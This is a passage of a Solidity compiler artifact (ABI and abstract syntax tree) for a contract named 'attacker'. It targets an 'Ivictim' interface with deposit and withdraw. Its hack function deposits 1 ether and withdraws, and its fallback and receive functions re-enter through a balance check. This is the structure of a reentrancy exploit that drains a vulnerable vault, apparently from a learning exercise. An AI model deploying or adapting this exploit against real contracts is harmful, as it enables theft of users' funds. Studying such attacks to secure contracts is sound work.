{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_bobolon",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "bobolon",
      "outputs": [
        {
          "internalType": "contract Ivictim",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "hack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "withdrawing",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "allSourcePaths": {
    "0": "contracts/attacker.sol"
  },
  "ast": {
    "absolutePath": "contracts/attacker.sol",
    "exportedSymbols": {
      "Ivictim": [
        8
      ],
      "attacker": [
        144
      ]
    },
    "id": 145,
    "license": "MIT",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          "^",
          "0.8",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "31:23:0"
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "Ivictim",
        "contractDependencies": [],
        "contractKind": "interface",
        "fullyImplemented": false,
        "id": 8,
        "linearizedBaseContracts": [
          8
        ],
        "name": "Ivictim",
        "nameLocation": "66:7:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "functionSelector": "d0e30db0",
            "id": 4,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "deposit",
            "nameLocation": "89:7:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 2,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "96:2:0"
            },
            "returnParameters": {
              "id": 3,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "115:0:0"
            },
            "scope": 8,
            "src": "80:36:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "functionSelector": "3ccfd60b",
            "id": 7,
            "implemented": false,
            "kind": "function",
            "modifiers": [],
            "name": "withdraw",
            "nameLocation": "131:8:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 5,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "139:2:0"
            },
            "returnParameters": {
              "id": 6,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "150:0:0"
            },
            "scope": 8,
            "src": "122:29:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 145,
        "src": "56:97:0",
        "usedErrors": []
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "attacker",
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 144,
        "linearizedBaseContracts": [
          144
        ],
        "name": "attacker",
        "nameLocation": "164:8:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "functionSelector": "6e103743",
            "id": 11,
            "mutability": "mutable",
            "name": "bobolon",
            "nameLocation": "194:7:0",
            "nodeType": "VariableDeclaration",
            "scope": 144,
            "src": "179:22:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_Ivictim_$8",
              "typeString": "contract Ivictim"
            },
            "typeName": {
              "id": 10,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 9,
                "name": "Ivictim",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 8,
                "src": "179:7:0"
              },
              "referencedDeclaration": 8,
              "src": "179:7:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_Ivictim_$8",
                "typeString": "contract Ivictim"
              }
            },
            "visibility": "public"
          },
          {
            "constant": false,
            "id": 13,
            "mutability": "immutable",
            "name": "loko",
            "nameLocation": "226:4:0",
            "nodeType": "VariableDeclaration",
            "scope": 144,
            "src": "208:22:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 12,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "208:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 15,
            "mutability": "immutable",
            "name": "owner",
            "nameLocation": "254:5:0",
            "nodeType": "VariableDeclaration",
            "scope": 144,
            "src": "236:23:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address",
              "typeString": "address"
            },
            "typeName": {
              "id": 14,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "236:7:0",
              "stateMutability": "nonpayable",
              "typeDescriptions": {
                "typeIdentifier": "t_address",
                "typeString": "address"
              }
            },
            "visibility": "internal"
          },
          {
            "body": {
              "id": 35,
              "nodeType": "Block",
              "src": "296:97:0",
              "statements": [
                {
                  "expression": {
                    "id": 24,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 20,
                      "name": "bobolon",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 11,
                      "src": "306:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Ivictim_$8",
                        "typeString": "contract Ivictim"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 22,
                          "name": "_bobolon",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 17,
                          "src": "324:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 21,
                        "name": "Ivictim",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 8,
                        "src": "316:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Ivictim_$8_$",
                          "typeString": "type(contract Ivictim)"
                        }
                      },
                      "id": 23,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "316:17:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Ivictim_$8",
                        "typeString": "contract Ivictim"
                      }
                    },
                    "src": "306:27:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Ivictim_$8",
                      "typeString": "contract Ivictim"
                    }
                  },
                  "id": 25,
                  "nodeType": "ExpressionStatement",
                  "src": "306:27:0"
                },
                {
                  "expression": {
                    "id": 28,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 26,
                      "name": "loko",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 13,
                      "src": "343:4:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "id": 27,
                      "name": "_bobolon",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 17,
                      "src": "350:8:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "343:15:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 29,
                  "nodeType": "ExpressionStatement",
                  "src": "343:15:0"
                },
                {
                  "expression": {
                    "id": 33,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 30,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 15,
                      "src": "368:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "expression": {
                        "id": 31,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -15,
                        "src": "376:3:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 32,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "src": "376:10:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "368:18:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 34,
                  "nodeType": "ExpressionStatement",
                  "src": "368:18:0"
                }
              ]
            },
            "id": 36,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 18,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 17,
                  "mutability": "mutable",
                  "name": "_bobolon",
                  "nameLocation": "286:8:0",
                  "nodeType": "VariableDeclaration",
                  "scope": 36,
                  "src": "278:16:0",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 16,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "278:7:0",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "277:18:0"
            },
            "returnParameters": {
              "id": 19,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "296:0:0"
            },
            "scope": 144,
            "src": "266:127:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 47,
              "nodeType": "Block",
              "src": "420:69:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 42,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 39,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "438:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 40,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "438:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "id": 41,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 15,
                          "src": "452:5:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "438:19:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "4e6f74206f776e6572",
                        "id": 43,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "459:11:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682",
                          "typeString": "literal_string \"Not owner\""
                        },
                        "value": "Not owner"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_c266efca4f4ed37612271196433531dcbb4fca89a694d568d1e290e32feb1682",
                          "typeString": "literal_string \"Not owner\""
                        }
                      ],
                      "id": 38,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "430:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 44,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "430:41:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 45,
                  "nodeType": "ExpressionStatement",
                  "src": "430:41:0"
                },
                {
                  "id": 46,
                  "nodeType": "PlaceholderStatement",
                  "src": "481:1:0"
                }
              ]
            },
            "id": 48,
            "name": "onlyOwner",
            "nameLocation": "408:9:0",
            "nodeType": "ModifierDefinition",
            "parameters": {
              "id": 37,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "417:2:0"
            },
            "src": "399:90:0",
            "virtual": false,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 55,
              "nodeType": "Block",
              "src": "523:34:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 52,
                        "name": "loko",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 13,
                        "src": "545:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "id": 51,
                      "name": "chekBalance",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 119,
                      "src": "533:11:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$returns$__$",
                        "typeString": "function (address)"
                      }
                    },
                    "id": 53,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "533:17:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 54,
                  "nodeType": "ExpressionStatement",
                  "src": "533:17:0"
                }
              ]
            },
            "id": 56,
            "implemented": true,
            "kind": "fallback",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 49,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "503:2:0"
            },
            "returnParameters": {
              "id": 50,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "523:0:0"
            },
            "scope": 144,
            "src": "495:62:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 63,
              "nodeType": "Block",
              "src": "590:34:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 60,
                        "name": "loko",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 13,
                        "src": "612:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      ],
                      "id": 59,
                      "name": "chekBalance",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 119,
                      "src": "600:11:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$returns$__$",
                        "typeString": "function (address)"
                      }
                    },
                    "id": 61,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "600:17:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 62,
                  "nodeType": "ExpressionStatement",
                  "src": "600:17:0"
                }
              ]
            },
            "id": 64,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 57,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "570:2:0"
            },
            "returnParameters": {
              "id": 58,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "590:0:0"
            },
            "scope": 144,
            "src": "563:61:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 97,
              "nodeType": "Block",
              "src": "673:155:0",
              "statements": [
                {
                  "expression": {
                    "arguments": [
                      {
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 77,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "expression": {
                            "id": 70,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "691:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 71,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "src": "691:9:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": ">=",
                        "rightExpression": {
                          "commonType": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "id": 76,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "leftExpression": {
                            "hexValue": "31",
                            "id": 72,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "704:1:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_1_by_1",
                              "typeString": "int_const 1"
                            },
                            "value": "1"
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "*",
                          "rightExpression": {
                            "commonType": {
                              "typeIdentifier": "t_rational_1000000000000000000_by_1",
                              "typeString": "int_const 1000000000000000000"
                            },
                            "id": 75,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "leftExpression": {
                              "hexValue": "3130",
                              "id": 73,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "708:2:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_10_by_1",
                                "typeString": "int_const 10"
                              },
                              "value": "10"
                            },
                            "nodeType": "BinaryOperation",
                            "operator": "**",
                            "rightExpression": {
                              "hexValue": "3138",
                              "id": 74,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "712:2:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_18_by_1",
                                "typeString": "int_const 18"
                              },
                              "value": "18"
                            },
                            "src": "708:6:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_1000000000000000000_by_1",
                              "typeString": "int_const 1000000000000000000"
                            }
                          },
                          "src": "704:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          }
                        },
                        "src": "691:23:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      },
                      {
                        "hexValue": "57726f6e672076616c75652c206974206d757374206265203e3d2031",
                        "id": 78,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "716:30:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_00e4dfaa852f5b7677bd59d54811dffd74dfaa624eb16178fc321f6d7815a77d",
                          "typeString": "literal_string \"Wrong value, it must be >= 1\""
                        },
                        "value": "Wrong value, it must be >= 1"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        },
                        {
                          "typeIdentifier": "t_stringliteral_00e4dfaa852f5b7677bd59d54811dffd74dfaa624eb16178fc321f6d7815a77d",
                          "typeString": "literal_string \"Wrong value, it must be >= 1\""
                        }
                      ],
                      "id": 69,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "683:7:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (bool,string memory) pure"
                      }
                    },
                    "id": 79,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "683:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 80,
                  "nodeType": "ExpressionStatement",
                  "src": "683:64:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "argumentTypes": [],
                        "expression": {
                          "id": 81,
                          "name": "bobolon",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 11,
                          "src": "757:7:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_Ivictim_$8",
                            "typeString": "contract Ivictim"
                          }
                        },
                        "id": 83,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "deposit",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 4,
                        "src": "757:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_payable$__$returns$__$",
                          "typeString": "function () payable external"
                        }
                      },
                      "id": 89,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "names": [
                        "value"
                      ],
                      "nodeType": "FunctionCallOptions",
                      "options": [
                        {
                          "commonType": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "id": 88,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "leftExpression": {
                            "hexValue": "31",
                            "id": 84,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "kind": "number",
                            "lValueRequested": false,
                            "nodeType": "Literal",
                            "src": "780:1:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_1_by_1",
                              "typeString": "int_const 1"
                            },
                            "value": "1"
                          },
                          "nodeType": "BinaryOperation",
                          "operator": "*",
                          "rightExpression": {
                            "commonType": {
                              "typeIdentifier": "t_rational_1000000000000000000_by_1",
                              "typeString": "int_const 1000000000000000000"
                            },
                            "id": 87,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": true,
                            "lValueRequested": false,
                            "leftExpression": {
                              "hexValue": "3130",
                              "id": 85,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "784:2:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_10_by_1",
                                "typeString": "int_const 10"
                              },
                              "value": "10"
                            },
                            "nodeType": "BinaryOperation",
                            "operator": "**",
                            "rightExpression": {
                              "hexValue": "3138",
                              "id": 86,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "number",
                              "lValueRequested": false,
                              "nodeType": "Literal",
                              "src": "788:2:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_rational_18_by_1",
                                "typeString": "int_const 18"
                              },
                              "value": "18"
                            },
                            "src": "784:6:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_rational_1000000000000000000_by_1",
                              "typeString": "int_const 1000000000000000000"
                            }
                          },
                          "src": "780:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          }
                        }
                      ],
                      "src": "757:34:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 90,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "757:36:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 91,
                  "nodeType": "ExpressionStatement",
                  "src": "757:36:0"
                },
                {
                  "expression": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "expression": {
                        "id": 92,
                        "name": "bobolon",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 11,
                        "src": "803:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_contract$_Ivictim_$8",
                          "typeString": "contract Ivictim"
                        }
                      },
                      "id": 94,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "withdraw",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": 7,
                      "src": "803:16:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                        "typeString": "function () external"
                      }
                    },
                    "id": 95,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "803:18:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 96,
                  "nodeType": "ExpressionStatement",
                  "src": "803:18:0"
                }
              ]
            },
            "functionSelector": "4de260a2",
            "id": 98,
            "implemented": true,
            "kind": "function",
            "modifiers": [
              {
                "id": 67,
                "kind": "modifierInvocation",
                "modifierName": {
                  "id": 66,
                  "name": "onlyOwner",
                  "nodeType": "IdentifierPath",
                  "referencedDeclaration": 48,
                  "src": "663:9:0"
                },
                "nodeType": "ModifierInvocation",
                "src": "663:9:0"
              }
            ],
            "name": "hack",
            "nameLocation": "639:4:0",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 65,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "643:2:0"
            },
            "returnParameters": {
              "id": 68,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "673:0:0"
            },
            "scope": 144,
            "src": "630:198:0",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 118,
              "nodeType": "Block",
              "src": "881:94:0",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    },
                    "id": 110,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "expression": {
                        "id": 103,
                        "name": "_victim",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 100,
                        "src": "895:7:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "id": 104,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "balance",
                      "nodeType": "MemberAccess",
                      "src": "895:15:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint256",
                        "typeString": "uint256"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": ">=",
                    "rightExpression": {
                      "commonType": {
                        "typeIdentifier": "t_rational_1000000000000000000_by_1",
                        "typeString": "int_const 1000000000000000000"
                      },
                      "id": 109,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "lValueRequested": false,
                      "leftExpression": {
                        "hexValue": "31",
                        "id": 105,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "914:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_1_by_1",
                          "typeString": "int_const 1"
                        },
                        "value": "1"
                      },
                      "nodeType": "BinaryOperation",
                      "operator": "*",
                      "rightExpression": {
                        "commonType": {
                          "typeIdentifier": "t_rational_1000000000000000000_by_1",
                          "typeString": "int_const 1000000000000000000"
                        },
                        "id": 108,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "leftExpression": {
                          "hexValue": "3130",
                          "id": 106,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "918:2:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_10_by_1",
                            "typeString": "int_const 10"
